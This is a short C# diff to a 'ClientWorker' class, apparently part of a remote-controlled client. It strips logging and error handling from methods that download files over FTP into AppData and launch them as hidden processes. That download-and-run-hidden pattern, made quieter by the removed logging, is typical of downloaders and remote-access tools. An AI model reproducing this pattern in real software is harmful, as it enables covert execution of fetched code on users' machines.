@@ -18,7 +18,6 @@ namespace ClientWorker
 
         public string TestFunc(string s)
         {
-            Log.Send("TestFunc Invoke!");
             return "TestFunc Compleate";
         }
 
@@ -88,13 +87,11 @@ namespace ClientWorker
         public void DownloadFloader(string ftpPath, string localPath)
         {
             FileManager.DownloadFloader(ftpPath, localPath);
-            Log.Send("DownloadFloader()");
         }
 
         public void DownloadUpdate()
         {
             GetUpd();
-            Log.Send("GetUpd()");
         }
 
         public void RunProgram(string file)
@@ -133,18 +130,10 @@ namespace ClientWorker
 
         public void GetUpd()
         {
-            Log.Send("GetUpd()");
             string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            try
-            {
                 KillUpdater();
                 FtpClient.DownloadF(StartData.updater, folderPath + StartData.floaderNewCopy);
                 FileManager.RunHideProc(folderPath + StartData.floaderNewCopy + StartData.updater);              
-            }
-            catch (Exception ex)
-            {
-                Log.Send("GetUpd failed: " + ex.ToString());
-            }
         }
 
         private void KillUpdater()
